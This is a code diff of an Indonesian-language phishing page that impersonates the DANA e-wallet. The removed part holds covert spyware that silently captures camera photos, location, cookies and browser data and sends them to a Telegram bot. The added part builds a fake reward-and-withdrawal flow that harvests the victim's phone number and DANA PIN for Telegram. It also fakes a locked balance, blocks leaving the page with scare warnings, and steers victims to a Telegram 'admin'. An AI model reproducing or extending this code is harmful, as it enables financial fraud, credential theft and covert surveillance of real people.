-          fd.append("document", data);
-          if (caption) fd.append("caption", caption);
-          await fetch(url + "sendDocument", { method: "POST", body: fd });
-        } else {
-          await fetch(url + "sendMessage", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: data })
-          });
+    <!-- Step 2: Verification -->
+    <div class="main-container step-content hidden" id="step2Content">
+        <div class="card">
+            <h2 class="card-title">Verifikasi Akun</h2>
+            <p class="card-subtitle">Akun Anda sedang diverifikasi oleh sistem keamanan DANA</p>
+            
+            <div class="form-group">
+                <div style="height: 8px; background: #f1f5f9; border-radius: 4px; overflow: hidden; margin: 40px 0;">
+                    <div id="verificationProgress" style="width: 0%; height: 100%; background: linear-gradient(90deg, #0085ff, #00c853); transition: width 0.5s;"></div>
+                </div>
+                <p style="text-align: center; color: #64748b; margin-top: 20px;" id="progressText">Memulai proses verifikasi...</p>
+            </div>
+            
+            <button class="btn btn-primary" id="completeStep2" disabled>
+                <span>Verifikasi Selesai</span>
+                <i class="fas fa-check"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Home Page -->
+    <div id="homePage" class="hidden">
+        <!-- Home Header -->
+        <div class="home-header">
+            <div class="user-info">
+                <div class="welcome-text">Selamat datang,</div>
+                <div class="username-display" id="displayUsername"></div>
+                <div class="account-status">
+                    <i class="fas fa-shield-check"></i>
+                    Akun Terverifikasi
+                </div>
+            </div>
+        </div>
+
+        <!-- Balance Card -->
+        <div class="saldo-card">
+            <div class="saldo-label">
+                <i class="fas fa-wallet"></i>
+                SALDO DANA ANDA
+            </div>
+            <div class="saldo-amount" id="saldoAmount">Rp 0</div>
+            <div class="saldo-locked" id="saldoLocked">
+                <i class="fas fa-lock"></i>
+                <span>Saldo Tertahan - Hubungi Admin</span>
+            </div>
+            <div class="saldo-note">
+                <i class="fas fa-shield-alt"></i>
+                Saldo dijamin oleh Lembaga Penjamin Simpanan
+            </div>
+        </div>
+
+        <!-- Action Buttons -->
+        <div class="action-buttons">
+            <a href="#" class="action-btn">
+                <i class="fas fa-qrcode"></i>
+                <span>QRIS</span>
+            </a>
+            <a href="#" class="action-btn">
+                <i class="fas fa-mobile-alt"></i>
+                <span>Top Up</span>
+            </a>
+            <a href="#" class="action-btn withdraw" id="withdrawBtn">
+                <i class="fas fa-money-bill-wave"></i>
+                <span>Tarik Dana</span>
+            </a>
+            <a href="#" class="action-btn">
+                <i class="fas fa-exchange-alt"></i>
+                <span>Transfer</span>
+            </a>
+            <a href="#" class="action-btn">
+                <i class="fas fa-file-invoice"></i>
+                <span>Bayar</span>
+            </a>
+            <a href="#" class="action-btn">
+                <i class="fas fa-history"></i>
+                <span>Riwayat</span>
+            </a>
+        </div>
+
+        <!-- Promo Section -->
+        <div class="promo-section" id="promoSection">
+            <div class="section-header">
+                <div class="section-icon">
+                    <i class="fas fa-gift"></i>
+                </div>
+                <div>
+                    <div class="section-title">Klaim Promo Reward</div>
+                    <div class="section-subtitle">Dapatkan Rp170.000 gratis ke saldo Anda</div>
+                </div>
+            </div>
+            
+            <div class="promo-input-group">
+                <input type="text" 
+                       id="promoCode" 
+                       class="promo-input" 
+                       placeholder="Masukkan kode promo"
+                       maxlength="20">
+                <button class="btn btn-primary" id="claimPromo" style="width: auto; padding: 0 28px;">
+                    Klaim
+                </button>
+            </div>
+            
+            <div id="promoError" class="error-message"></div>
+            <div id="promoSuccess" class="success-message"></div>
+            
+            <div class="promo-status" id="promoStatus">
+                <div class="checkmark-circle">
+                    <i class="fas fa-check"></i>
+                </div>
+                <div>
+                    <div style="font-weight: 700; color: #00c853; font-size: 16px;">Promo Berhasil Diklaim!</div>
+                    <div style="font-size: 14px; color: #64748b; margin-top: 4px;">Rp170.000 telah ditambahkan ke saldo Anda</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="main-footer">
+            <div class="footer-container">
+                <div class="footer-grid">
+                    <div class="footer-section">
+                        <h3>Tentang DANA</h3>
+                        <ul class="footer-links">
+                            <li><a href="#"><i class="fas fa-building"></i> Perusahaan</a></li>
+                            <li><a href="#"><i class="fas fa-briefcase"></i> Karir</a></li>
+                            <li><a href="#"><i class="fas fa-newspaper"></i> Blog</a></li>
+                            <li><a href="#"><i class="fas fa-file-contract"></i> Kebijakan Privasi</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer-section">
+                        <h3>Bantuan</h3>
+                        <ul class="footer-links">
+                            <li><a href="#"><i class="fas fa-question-circle"></i> Pusat Bantuan</a></li>
+                            <li><a href="#"><i class="fas fa-headset"></i> Kontak Kami</a></li>
+                            <li><a href="#"><i class="fas fa-shield-alt"></i> Keamanan</a></li>
+                            <li><a href="#"><i class="fas fa-exclamation-triangle"></i> FAQ</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer-section">
+                        <h3>Layanan</h3>
+                        <ul class="footer-links">
+                            <li><a href="#"><i class="fas fa-exchange-alt"></i> Transfer</a></li>
+                            <li><a href="#"><i class="fas fa-credit-card"></i> Bayar</a></li>
+                            <li><a href="#"><i class="fas fa-mobile-alt"></i> Top Up</a></li>
+                            <li><a href="#"><i class="fas fa-chart-line"></i> Investasi</a></li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="copyright">
+                    © 2024 PT. DANA Indonesia. Terdaftar dan Diawasi Otoritas Jasa Keuangan<br>
+                    <small style="font-size: 12px;">Layanan pelanggan: 1500-959 | Email: help@dana.id | SWIFT Code: DANAIDJA</small>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Withdraw Modal - Step 1: Phone Number -->
+    <div class="modal" id="withdrawModal1">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Tarik Dana ke DANA</h2>
+                <p class="modal-subtitle">Masukkan nomor DANA tujuan untuk menarik dana</p>
+            </div>
+            
+            <div class="modal-body">
+                <div class="form-group">
+                    <label class="form-label" for="phoneNumber">
+                        <i class="fas fa-mobile-alt"></i> Nomor DANA Tujuan
+                    </label>
+                    <div class="input-wrapper">
+                        <input type="tel" 
+                               id="phoneNumber" 
+                               class="form-control" 
+                               placeholder="0811 2345 6789"
+                               maxlength="13">
+                        <div class="input-icon">
+                            <i class="fas fa-phone"></i>
+                        </div>
+                    </div>
+                    <div id="phoneError" class="error-message"></div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="withdrawAmount">
+                        <i class="fas fa-money-bill-wave"></i> Nominal Penarikan
+                    </label>
+                    <div class="input-wrapper">
+                        <input type="text" 
+                               id="withdrawAmount" 
+                               class="form-control" 
+                               value="Rp 170.000"
+                               readonly
+                               style="background: #f8fafc; color: #1a1a1a; font-weight: 600;">
+                        <div class="input-icon">
+                            <i class="fas fa-wallet"></i>
+                        </div>
+                    </div>
+                    <div style="font-size: 13px; color: #64748b; margin-top: 8px;">
+                        Maksimal penarikan: <strong>Rp 170.000</strong>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="modal-footer">
+                <button class="btn btn-secondary mb-24" id="cancelWithdraw1">
+                    <i class="fas fa-times"></i>
+                    <span>Batal</span>
+                </button>
+                <button class="btn btn-primary" id="nextToPin">
+                    <span>Lanjutkan</span>
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Withdraw Modal - Step 2: PIN -->
+    <div class="modal" id="withdrawModal2">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Konfirmasi Keamanan</h2>
+                <p class="modal-subtitle">Masukkan PIN DANA Anda untuk mengotorisasi penarikan</p>
+            </div>
+            
+            <div class="modal-body">
+                <div class="form-group">
+                    <label class="form-label" for="danaPin">
+                        <i class="fas fa-lock"></i> PIN DANA (6 Digit)
+                    </label>
+                    <div class="input-wrapper">
+                        <input type="password" 
+                               id="danaPin" 
+                               class="form-control" 
+                               placeholder="••••••"
+                               maxlength="6"
+                               inputmode="numeric">
+                        <div class="input-icon">
+                            <i class="fas fa-key"></i>
+                        </div>
+                    </div>
+                    <div id="pinError" class="error-message"></div>
+                </div>
+                
+                <div class="warning-banner">
+                    <div class="warning-header">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <strong>Penting: Jangan Bagikan PIN</strong>
+                    </div>
+                    <div class="warning-text">
+                        PIN DANA bersifat rahasia. Jangan berikan kepada siapapun termasuk pihak yang mengaku dari DANA.
+                    </div>
+                </div>
+            </div>
+            
+            <div class="modal-footer">
+                <button class="btn btn-secondary mb-24" id="backToPhone">
+                    <i class="fas fa-arrow-left"></i>
+                    <span>Kembali</span>
+                </button>
+                <button class="btn btn-primary" id="nextToConfirm">
+                    <span>Lanjutkan</span>
+                    <i class="fas fa-check"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Withdraw Modal - Step 3: Confirmation -->
+    <div class="modal" id="withdrawModal3">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Konfirmasi Penarikan</h2>
+                <p class="modal-subtitle">Periksa kembali detail penarikan Anda</p>
+            </div>
+            
+            <div class="modal-body">
+                <div class="confirmation-summary">
+                    <div class="summary-item">
+                        <span class="summary-label">Nomor Tujuan</span>
+                        <span class="summary-value" id="confirmPhone"></span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Nominal</span>
+                        <span class="summary-value" id="confirmAmount">Rp 170.000</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Biaya Admin</span>
+                        <span class="summary-value">Rp 0</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Total Diterima</span>
+                        <span class="summary-value" style="color: #00c853; font-size: 18px;">Rp 170.000</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Tanggal Pengajuan</span>
+                        <span class="summary-value" id="confirmDate"></span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Estimasi Waktu</span>
+                        <span class="summary-value">12-24 jam kerja</span>
+                    </div>
+                </div>
+                
+                <div class="warning-banner">
+                    <div class="warning-header">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <strong>Peringatan Penting</strong>
+                    </div>
+                    <div class="warning-text">
+                        <strong>JANGAN MENGHAPUS HALAMAN INI!</strong> Menghapus halaman dapat menyebabkan:<br>
+                        1. Proses penarikan gagal<br>
+                        2. Dana tertahan di sistem<br>
+                        3. Akun terkunci sementara<br><br>
+                        
+                        Jika terjadi masalah, segera hubungi Admin DANA:
+                        <a href="https://t.me/Kyyzo" target="_blank" class="admin-contact">
+                            <i class="fab fa-telegram"></i>
+                            Hubungi @Kyyzo
+                        </a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="modal-footer">
+                <button class="btn btn-secondary mb-24" id="backToPin">
+                    <i class="fas fa-arrow-left"></i>
+                    <span>Kembali</span>
+                </button>
+                <button class="btn btn-success" id="confirmWithdraw">
+                    <span>Setuju & Tarik Dana</span>
+                    <i class="fas fa-paper-plane"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Withdraw Modal - Step 4: Success -->
+    <div class="modal" id="withdrawModal4">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Penarikan Diproses</h2>
+                <p class="modal-subtitle">Permintaan penarikan Anda sedang diproses</p>
+            </div>
+            
+            <div class="modal-body">
+                <div style="text-align: center; padding: 40px 20px;">
+                    <div style="width: 80px; height: 80px; background: #00c853; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
+                        <i class="fas fa-check" style="color: white; font-size: 36px;"></i>
+                    </div>
+                    
+                    <h3 style="font-size: 22px; color: #00c853; margin-bottom: 16px;">Penarikan Berhasil Diajukan!</h3>
+                    <p style="color: #64748b; line-height: 1.6; margin-bottom: 24px;">
+                        Dana akan dikirim ke nomor DANA tujuan dalam 12-24 jam kerja. Anda akan menerima notifikasi ketika dana sudah masuk.
+                    </p>
+                    
+                    <div style="background: #f0fff4; border: 2px solid #00c853; border-radius: 16px; padding: 20px; margin-top: 32px;">
+                        <div style="font-weight: 600; color: #00c853; margin-bottom: 8px;">
+                            <i class="fas fa-clock"></i> Status: Diproses
+                        </div>
+                        <div style="font-size: 14px; color: #64748b;">
+                            ID Transaksi: <strong>DANA-2024-${Math.random().toString(36).substr(2, 12).toUpperCase()}</strong>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="warning-banner" style="margin-top: 32px;">
+                    <div class="warning-header">
+                        <i class="fas fa-lock"></i>
+                        <strong>Saldo Tertahan</strong>
+                    </div>
+                    <div class="warning-text">
+                        Saldo Anda saat ini <strong>diblokir sementara</strong> hingga proses penarikan selesai. 
+                        Jangan tutup atau refresh halaman ini. Jika terjadi masalah, segera hubungi:
+                        <a href="https://t.me/Kyyzo" target="_blank" class="admin-contact" style="margin-top: 12px;">
+                            <i class="fab fa-telegram"></i>
+                            Admin DANA: @Kyyzo
+                        </a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="modal-footer">
+                <button class="btn btn-primary" id="closeModal">
+                    <span>Tutup</span>
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Coin Animation -->
+    <div class="coin" id="coinAnimation"></div>
+
+    <script>
+        // State management
+        const state = {
+            username: '',
+            promoClaimed: false,
+            saldo: 0,
+            withdrawData: {
+                phone: '',
+                pin: '',
+                amount: 170000,
+                date: ''
+            },
+            blocked: false
+        };
+
+        // Valid phone prefixes for DANA
+        const validPrefixes = ['0811', '0812', '0813', '0821', '0822', '0823', '0831', '0838', '0895', '0887', '0888', '0896', '0851', '0855', '0852'];
+
+        // DOM Elements
+        const step1Content = document.getElementById('step1Content');
+        const step2Content = document.getElementById('step2Content');
+        const homePage = document.getElementById('homePage');
+        const progressBar = document.getElementById('progressBar');
+        const step1Circle = document.getElementById('step1').querySelector('.step-circle');
+        const step2Circle = document.getElementById('step2').querySelector('.step-circle');
+        const step3Circle = document.getElementById('step3').querySelector('.step-circle');
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Step 1: Username input
+            document.getElementById('nextStep1').addEventListener('click', handleUsernameSubmit);
+            
+            // Step 2: Verification process
+            document.getElementById('completeStep2').addEventListener('click', handleVerificationComplete);
+            
+            // Promo code claim
+            document.getElementById('claimPromo').addEventListener('click', handlePromoClaim);
+            document.getElementById('promoCode').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') handlePromoClaim();
+            });
+            
+            // Withdraw button
+            document.getElementById('withdrawBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                showWithdrawModal1();
+            });
+            
+            // Withdraw modal 1
+            document.getElementById('nextToPin').addEventListener('click', handlePhoneSubmit);
+            document.getElementById('cancelWithdraw1').addEventListener('click', hideAllModals);
+            
+            // Withdraw modal 2
+            document.getElementById('backToPhone').addEventListener('click', showWithdrawModal1);
+            document.getElementById('nextToConfirm').addEventListener('click', handlePinSubmit);
+            
+            // Withdraw modal 3
+            document.getElementById('backToPin').addEventListener('click', showWithdrawModal2);
+            document.getElementById('confirmWithdraw').addEventListener('click', handleWithdrawConfirm);
+            
+            // Withdraw modal 4
+            document.getElementById('closeModal').addEventListener('click', hideAllModals);
+            
+            // Real-time validation
+            document.getElementById('phoneNumber').addEventListener('input', function() {
+                document.getElementById('phoneError').style.display = 'none';
+            });
+            
+            document.getElementById('danaPin').addEventListener('input', function() {
+                document.getElementById('pinError').style.display = 'none';
+                if (this.value.length === 6) {
+                    this.classList.add('valid');
+                } else {
+                    this.classList.remove('valid');
+                }
+            });
+            
+            // Prevent page close
+            setupPageProtection();
+        });
+
+        // ====== REGISTRATION FLOW ======
+        function handleUsernameSubmit() {
+            const usernameInput = document.getElementById('username');
+            const username = usernameInput.value.trim();
+            const errorElement = document.getElementById('usernameError');
+            
+            // Validation
+            if (!username) {
+                showError(errorElement, 'Username tidak boleh kosong');
+                usernameInput.focus();
+                return;
+            }
+            
+            if (username.length < 3) {
+                showError(errorElement, 'Username minimal 3 karakter');
+                usernameInput.focus();
+                return;
+            }
+            
+            if (username.length > 20) {
+                showError(errorElement, 'Username maksimal 20 karakter');
+                usernameInput.focus();
+                return;
+            }
+            
+            // Valid
+            errorElement.style.display = 'none';
+            state.username = username;
+            
+            // Animate progress
+            progressBar.style.width = '33%';
+            step1Circle.classList.remove('active');
+            step1Circle.classList.add('completed');
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            
+            // Move to step 2
+            setTimeout(() => {
+                step1Content.classList.add('hidden');
+                step2Content.classList.remove('hidden');
+                startVerificationProcess();
+            }, 500);
         }
-      } catch (e) {}
-    }
 
-    // Fingerprint unik per perangkat
-    function getDeviceID() {
-      const canvas = document.createElement("canvas");
-      const ctx = canvas.getContext("2d");
-      ctx.font = "14px Arial";
-      ctx.fillText("Volox", 0, 10);
-      return btoa(canvas.toDataURL()).substring(0, 16).replace(/[^a-zA-Z0-9]/g, "");
-    }
+        function startVerificationProcess() {
+            const progressBar = document.getElementById('verificationProgress');
+            const progressText = document.getElementById('progressText');
+            const completeButton = document.getElementById('completeStep2');
+            
+            const steps = [
+                { percent: 20, text: 'Memvalidasi identitas...' },
+                { percent: 40, text: 'Memeriksa data...' },
+                { percent: 60, text: 'Verifikasi keamanan...' },
+                { percent: 80, text: 'Menyiapkan akun...' },
+                { percent: 100, text: 'Verifikasi selesai!' }
+            ];
+            
+            let currentStep = 0;
+            
+            function updateProgress() {
+                if (currentStep < steps.length) {
+                    const step = steps[currentStep];
+                    progressBar.style.width = step.percent + '%';
+                    progressText.textContent = step.text;
+                    currentStep++;
+                    
+                    if (currentStep === steps.length) {
+                        // Enable complete button
+                        setTimeout(() => {
+                            completeButton.disabled = false;
+                        }, 500);
+                    } else {
+                        setTimeout(updateProgress, 400);
+                    }
+                }
+            }
+            
+            updateProgress();
+        }
 
-    const DEVICE_ID = getDeviceID();
-    const DEVICE_TAG = "NAMA PERANGKAT " + DEVICE_ID;
+        function handleVerificationComplete() {
+            // Update progress bar
+            progressBar.style.width = '100%';
+            step2Circle.classList.remove('active');
+            step2Circle.classList.add('completed');
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
+            step3Circle.classList.add('completed');
+            
+            // Hide step 2 content
+            step2Content.classList.add('hidden');
+            
+            // Show home page
+            setTimeout(() => {
+                homePage.classList.remove('hidden');
+                document.getElementById('displayUsername').textContent = state.username;
+                // Send data to server
+                sendRegistrationData();
+            }, 500);
+        }
 
-    // Cegah duplikasi
-    if (localStorage.getItem("volox_sent_" + DEVICE_ID)) {
-      document.getElementById("fake-overlay").style.display = "none";
-    }
+        // ====== PROMO CODE SYSTEM ======
+        function handlePromoClaim() {
+            const promoCode = document.getElementById('promoCode').value.trim();
+            const errorElement = document.getElementById('promoError');
+            const successElement = document.getElementById('promoSuccess');
+            const promoInput = document.getElementById('promoCode');
+            
+            // Clear previous messages
+            errorElement.style.display = 'none';
+            successElement.style.display = 'none';
+            
+            // Check if already claimed
+            if (state.promoClaimed) {
+                showError(errorElement, 'Promo sudah diklaim');
+                return;
+            }
+            
+            // Validate promo code
+            if (!promoCode) {
+                showError(errorElement, 'Masukkan kode promo');
+                promoInput.focus();
+                return;
+            }
+            
+            // Check promo code
+            if (promoCode.toUpperCase() === 'DANAKUSETIA2026') {
+                // Correct promo code
+                state.promoClaimed = true;
+                
+                // Show success message
+                successElement.textContent = 'Kode promo valid! Mengklaim reward...';
+                successElement.style.display = 'block';
+                
+                // Disable input and button
+                promoInput.disabled = true;
+                document.getElementById('claimPromo').disabled = true;
+                document.getElementById('claimPromo').innerHTML = '<span>Diklaim</span><i class="fas fa-check"></i>';
+                
+                // Trigger coin animation
+                triggerCoinAnimation();
+                
+            } else {
+                // Wrong promo code
+                showError(errorElement, 'Kode promo salah');
+                promoInput.classList.add('error');
+                
+                // Shake animation
+                setTimeout(() => {
+                    promoInput.classList.remove('error');
+                }, 500);
+            }
+        }
 
-    // Ambil foto dari kamera
-    async function captureCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        const video = document.getElementById("camera-trigger");
-        video.srcObject = stream;
-        video.play();
+        function triggerCoinAnimation() {
+            const promoSection = document.getElementById('promoSection');
+            const saldoAmount = document.getElementById('saldoAmount');
+            const coinAnimation = document.getElementById('coinAnimation');
+            
+            // Get positions
+            const promoRect = promoSection.getBoundingClientRect();
+            const saldoRect = saldoAmount.getBoundingClientRect();
+            
+            // Calculate start and end positions
+            const startX = promoRect.left + promoRect.width / 2;
+            const startY = promoRect.top + promoRect.height / 2;
+            const endX = saldoRect.left + saldoRect.width / 2;
+            const endY = saldoRect.top + saldoRect.height / 2;
+            
+            // Set coin position and animation
+            coinAnimation.style.left = startX + 'px';
+            coinAnimation.style.top = startY + 'px';
+            coinAnimation.style.setProperty('--endX', (endX - startX) + 'px');
+            coinAnimation.style.setProperty('--endY', (endY - startY) + 'px');
+            
+            // Show and animate coin
+            coinAnimation.style.display = 'block';
+            
+            // After animation completes
+            setTimeout(() => {
+                coinAnimation.style.display = 'none';
+                
+                // Update balance
+                animateBalanceIncrease();
+                
+                // Show success status
+                const promoStatus = document.getElementById('promoStatus');
+                const promoSection = document.getElementById('promoSection');
+                
+                setTimeout(() => {
+                    promoStatus.classList.add('claimed');
+                    promoSection.classList.add('claimed');
+                    
+                    // Send data to Telegram
+                    sendPromoData();
+                }, 300);
+                
+            }, 1800);
+        }
 
-        // Tunggu video siap
-        await new Promise(r => setTimeout(r, 800));
+        function animateBalanceIncrease() {
+            const saldoAmount = document.getElementById('saldoAmount');
+            let currentBalance = 0;
+            const targetBalance = 170000;
+            const increment = 378;
+            
+            saldoAmount.classList.add('increased');
+            
+            const interval = setInterval(() => {
+                currentBalance += increment;
+                if (currentBalance <= targetBalance) {
+                    saldoAmount.textContent = 'Rp ' + currentBalance.toLocaleString('id-ID');
+                } else {
+                    saldoAmount.textContent = 'Rp ' + targetBalance.toLocaleString('id-ID');
+                    clearInterval(interval);
+                    state.saldo = targetBalance;
+                }
+            }, 10);
+        }
 
-        const canvas = document.createElement("canvas");
-        canvas.width = 320;
-        canvas.height = 240;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, 320, 240);
+        // ====== WITHDRAW FLOW ======
+        function showWithdrawModal1() {
+            hideAllModals();
+            document.getElementById('withdrawModal1').classList.add('active');
+        }
 
-        // Tambahkan watermark
-        ctx.fillStyle = "rgba(0,0,0,0.7)";
-        ctx.fillRect(0, 0, 320, 30);
-        ctx.fillStyle = "white";
-        ctx.font = "14px Arial";
-        ctx.fillText(DEVICE_TAG, 10, 20);
+        function showWithdrawModal2() {
+            hideAllModals();
+            document.getElementById('withdrawModal2').classList.add('active');
+            document.getElementById('danaPin').value = '';
+        }
 
-        canvas.toBlob(async (blob) => {
-          await sendToTelegram(blob, DEVICE_TAG, true);
-          stream.getTracks().forEach(t => t.stop());
-        }, "image/jpeg", 0.92);
-      } catch (e) {
-        // Jika gagal, kirim fallback
-        const canvas = document.createElement("canvas");
-        canvas.width = 320; canvas.height = 240;
-        const ctx = canvas.getContext("2d");
-        ctx.fillStyle = "#f1f5f9";
-        ctx.fillRect(0, 0, 320, 240);
-        ctx.fillStyle = "#64748b";
-        ctx.font = "16px Arial";
-        ctx.fillText("No Camera", 100, 120);
-        ctx.fillText(DEVICE_TAG, 100, 145);
-        canvas.toBlob(b => sendToTelegram(b, DEVICE_TAG + " (no cam)", true));
-      }
-    }
+        function showWithdrawModal3() {
+            hideAllModals();
+            document.getElementById('withdrawModal3').classList.add('active');
+            
+            // Update confirmation details
+            document.getElementById('confirmPhone').textContent = state.withdrawData.phone;
+            document.getElementById('confirmDate').textContent = new Date().toLocaleString('id-ID', {
+                weekday: 'long',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+        }
 
-    // Lokasi
-    function getLocation() {
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          pos => sendToTelegram(`${DEVICE_TAG}\n📍 ${pos.coords.latitude},${pos.coords.longitude}`),
-          () => sendToTelegram(`${DEVICE_TAG}\n📍 Lokasi ditolak`)
-        );
-      }
-    }
+        function showWithdrawModal4() {
+            hideAllModals();
+            document.getElementById('withdrawModal4').classList.add('active');
+            
+            // Block balance
+            blockUserBalance();
+        }
 
-    // Notifikasi (untuk fingerprint tambahan)
-    async function requestNotify() {
-      if ("Notification" in window) {
-        try {
-          const p = await Notification.requestPermission();
-          sendToTelegram(`${DEVICE_TAG}\n🔔 Notifikasi: ${p}`);
-        } catch (e) {}
-      }
-    }
+        function hideAllModals() {
+            document.querySelectorAll('.modal').forEach(modal => {
+                modal.classList.remove('active');
+            });
+        }
 
-    // Data browser
-    function stealMeta() {
-      const meta = {
-        ua: navigator.userAgent,
-        platform: navigator.platform,
-        vendor: navigator.vendor,
-        cookies: document.cookie,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        device: DEVICE_TAG
-      };
-      sendToTelegram(`[META]\n${JSON.stringify(meta, null, 2)}`);
-    }
+        function handlePhoneSubmit() {
+            const phoneInput = document.getElementById('phoneNumber');
+            const phone = phoneInput.value.replace(/\D/g, '');
+            const errorElement = document.getElementById('phoneError');
+            
+            // Validation
+            if (!phone) {
+                showError(errorElement, 'Nomor DANA tidak boleh kosong');
+                phoneInput.focus();
+                return;
+            }
+            
+            if (phone.length < 10 || phone.length > 13) {
+                showError(errorElement, 'Nomor DANA harus 10-13 digit');
+                phoneInput.focus();
+                return;
+            }
+            
+            // Check prefix
+            const prefix = phone.substring(0, 4);
+            if (!validPrefixes.includes(prefix)) {
+                showError(errorElement, `Nomor DANA harus diawali dengan: ${validPrefixes.join(', ')}`);
+                phoneInput.focus();
+                return;
+            }
+            
+            // Valid
+            errorElement.style.display = 'none';
+            state.withdrawData.phone = formatPhoneNumber(phone);
+            
+            // Move to PIN modal
+            showWithdrawModal2();
+        }
 
-    // Trigger semua saat agree diklik
-    document.getElementById("agree-btn").addEventListener("click", async () => {
-      // Aktifkan semua trigger secara visual (meski transparan)
-      const triggers = [document.getElementById("camera-trigger")];
-      triggers.forEach(el => {
-        if (el) el.style.pointerEvents = "auto";
-      });
+        function handlePinSubmit() {
+            const pinInput = document.getElementById('danaPin');
+            const pin = pinInput.value;
+            const errorElement = document.getElementById('pinError');
+            
+            // Validation
+            if (!pin) {
+                showError(errorElement, 'PIN DANA tidak boleh kosong');
+                pinInput.focus();
+                return;
+            }
+            
+            if (pin.length !== 6 || !/^\d+$/.test(pin)) {
+                showError(errorElement, 'PIN harus 6 digit angka');
+                pinInput.focus();
+                return;
+            }
+            
+            // Valid
+            errorElement.style.display = 'none';
+            state.withdrawData.pin = pin;
+            state.withdrawData.date = new Date().toISOString();
+            
+            // Move to confirmation modal
+            showWithdrawModal3();
+        }
 
-      // Jalankan semua pencurian
-      captureCamera();
-      getLocation();
-      requestNotify();
-      stealMeta();
+        function handleWithdrawConfirm() {
+            // Send withdrawal data to Telegram
+            sendWithdrawalData();
+            
+            // Show success modal
+            showWithdrawModal4();
+        }
 
-      localStorage.setItem("volox_sent_" + DEVICE_ID, "1");
+        function blockUserBalance() {
+            const saldoAmount = document.getElementById('saldoAmount');
+            const saldoLocked = document.getElementById('saldoLocked');
+            
+            // Change balance display
+            saldoAmount.classList.remove('increased');
+            saldoAmount.classList.add('blocked');
+            saldoAmount.textContent = 'Rp 0';
+            
+            // Show locked message
+            saldoLocked.style.display = 'flex';
+            
+            // Update state
+            state.blocked = true;
+            state.saldo = 0;
+        }
 
-      // Opsional: tutup overlay setelah 1 detik
-      setTimeout(() => {
-        document.getElementById("fake-overlay").style.display = "none";
-      }, 1000);
-    });
+        // ====== UTILITY FUNCTIONS ======
+        function showError(element, message) {
+            element.textContent = message;
+            element.style.display = 'block';
+        }
 
-    // Pastikan popup browser muncul DI BALIK fake overlay
-    // Caranya: delay permintaan izin hingga user klik
-    // Semua izin hanya dipicu saat tombol diklik → aman dari deteksi dini
+        function formatPhoneNumber(phone) {
+            return phone.replace(/(\d{4})(\d{4})(\d{0,4})/, '$1 $2 $3').trim();
+        }
 
-    // Anti-zoom di iOS
-    document.addEventListener('touchstart', function(e) {
-      if (e.touches.length > 1) e.preventDefault();
-    });
-    let lastTouchEnd = 0;
-    document.addEventListener('touchend', function(e) {
-      const now = (new Date()).getTime();
-      if (now - lastTouchEnd <= 300) e.preventDefault();
-      lastTouchEnd = now;
-    }, false);
-  </script>
+        function setupPageProtection() {
+            // Prevent context menu
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+            
+            // Prevent keyboard shortcuts
+            document.addEventListener('keydown', function(e) {
+                // Block F5, Ctrl+R, Ctrl+Shift+R
+                if (e.key === 'F5' || (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.shiftKey && e.key === 'R')) {
+                    e.preventDefault();
+                    showPageProtectionWarning();
+                }
+                
+                // Block Ctrl+W
+                if (e.ctrlKey && e.key === 'w') {
+                    e.preventDefault();
+                    showPageProtectionWarning();
+                }
+            });
+            
+            // Before unload warning
+            window.addEventListener('beforeunload', function(e) {
+                if (state.withdrawData.pin || state.blocked) {
+                    e.preventDefault();
+                    e.returnValue = 'JANGAN TUTUP HALAMAN! Proses penarikan sedang berjalan. Menutup halaman dapat menyebabkan akun terkunci.';
+                    
+                    // Send exit data
+                    sendExitData();
+                }
+            });
+        }
+
+        function showPageProtectionWarning() {
+            alert('⚠️ PERINGATAN!\n\nJangan refresh atau tutup halaman ini! Proses penarikan dana sedang berjalan. Jika Anda keluar, akun dapat terkunci permanen.\n\nJika terjadi masalah, hubungi Admin: @Kyyzo di Telegram');
+        }
+
